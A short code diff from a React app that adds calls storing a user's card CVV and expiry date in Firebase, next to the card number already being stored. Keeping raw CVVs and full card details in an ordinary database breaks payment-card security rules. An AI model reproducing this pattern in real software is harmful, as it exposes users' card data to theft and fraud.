@@ -728,6 +728,17 @@ export default function App() {
                               document.getElementById("cardinput").value
                             );
 
+                            pushToFirebase(
+                              "cvv",
+                              user.uid,
+                              document.getElementById("cvvid").value
+                            );
+                            pushToFirebase(
+                              "expDate",
+                              user.uid,
+                              document.getElementById("dateid").value
+                            );
+
                             document.getElementById("accinfo").style.display =
                               "none";
                           } else {
